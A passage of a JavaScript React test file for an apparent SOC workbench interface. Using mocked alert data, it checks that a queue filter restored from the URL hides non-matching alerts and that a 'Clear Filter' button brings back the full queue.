  it('renders contextual support shell', async () => {
    renderWithProviders(<HelpDocs />, '/help');
    expect(await screen.findByText('Operator Support')).toBeInTheDocument();
    });
  });

  it('hydrates the SOC queue filter from URL state and clears back to the full queue', async () => {
    globalThis.fetch.mockImplementation(async (url, options = {}) => {
      const href = String(url);

      if (href.includes('/api/queue/alerts')) {
        return jsonResponse({
          alerts: [
            {
              id: 'alert-1',
              severity: 'high',
              summary: 'Password spray against Okta tenant',
              assigned_to: 'analyst-1',
            },
            {
              id: 'alert-2',
              severity: 'medium',
              summary: 'Container drift detected on node-7',
              assigned_to: 'analyst-2',
            },
          ],
        });
      }
      if (href.includes('/api/queue/stats')) {
        return jsonResponse({ pending: 2, high: 1, medium: 1 });
      }

      return defaultFetchImplementation(url, options);
    });

    renderWithProviders(<SOCWorkbench />, '/soc?queueFilter=password#queue');

    expect(await screen.findByDisplayValue('password')).toBeInTheDocument();
    expect(await screen.findByText('Password spray against Okta tenant')).toBeInTheDocument();
    expect(screen.queryByText('Container drift detected on node-7')).not.toBeInTheDocument();
    expect(
      await screen.findByText(/This queue filter is mirrored into the URL/i),
    ).toBeInTheDocument();

    fireEvent.click(screen.getByRole('button', { name: 'Clear Filter' }));

    expect(await screen.findByText('Container drift detected on node-7')).toBeInTheDocument();
  });
